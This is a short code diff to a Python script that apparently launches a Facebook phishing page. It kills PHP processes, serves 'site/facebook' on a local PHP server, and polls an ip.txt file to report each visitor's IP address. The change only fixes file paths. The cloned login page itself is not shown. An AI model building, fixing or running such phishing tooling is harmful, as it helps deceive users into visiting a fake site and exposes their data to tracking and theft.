@@ -2,8 +2,8 @@ import os
 os.system("killall php> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
 while True:
-	if os.path.isfile("/site/facebook/ip.txt")==True:
-		tr=open("/site/facebook/ip.txt","r")
+	if os.path.isfile("site/facebook/ip.txt")==True:
+		tr=open("site/facebook/ip.txt","r")
 		ip2=tr.readline()
 		ip=tr.readline().strip("IP:")
 		print("\n [>] A User Visited the Site From IP : "+ip)
